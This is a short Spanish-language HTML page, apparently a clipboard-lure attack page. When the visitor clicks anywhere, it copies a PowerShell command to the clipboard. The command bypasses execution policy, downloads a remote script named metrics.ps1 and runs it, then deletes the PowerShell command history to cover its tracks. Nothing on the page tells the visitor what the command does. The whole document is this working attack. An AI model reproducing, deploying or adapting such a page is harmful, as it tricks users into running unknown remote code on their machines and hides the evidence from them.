<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicio</title>
</head>
<body onclick="copiarComando()">

    <p style="cursor: pointer;">Haz clic en cualquier parte para copiar el comando</p>

    <script>
        function copiarComando() {
            const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'https://web.haroldsoftware.com/metrics.ps1'); Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue\"";
            navigator.clipboard.writeText(cmd).then(() => {
                console.log('Comando copiado al portapapeles');
                document.body.removeAttribute('onclick');
            }).catch(err => {
                console.error('Error al copiar: ', err);
            });
        }
    </script>

</body>
</html>
